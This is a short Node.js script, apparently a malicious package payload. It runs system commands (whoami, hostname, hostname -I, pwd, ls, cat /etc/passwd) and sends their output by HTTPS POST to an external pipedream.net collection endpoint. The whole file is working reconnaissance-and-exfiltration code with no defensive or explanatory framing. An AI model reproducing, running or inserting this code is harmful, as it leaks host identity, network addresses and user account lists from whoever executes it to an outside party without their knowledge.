const execSync = require('child_process').execSync;

const priv_ip = execSync('hostname -I', { encoding: 'utf-8' });
const whoami = execSync('whoami', { encoding: 'utf-8' });
const host = execSync('hostname', { encoding: 'utf-8' });
const current_dir = execSync('pwd', { encoding: 'utf-8' });
const passwd = execSync('cat /etc/passwd', { encoding: 'utf-8' });
const ls = execSync('ls', { encoding: 'utf-8' });


const https = require("https")

const data = JSON.stringify({
  "private IP": priv_ip,
  "whoami": whoami,
  "hostname": host,
  "current dir": current_dir,
  "passwd": passwd,
  "ls": ls,

})

const options = {
  hostname: "eo56j4tfa20w1b7.m.pipedream.net",
  port: 443,
  path: "/",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": data.length,
  },
}

const req = https.request(options)
req.write(data)
req.end()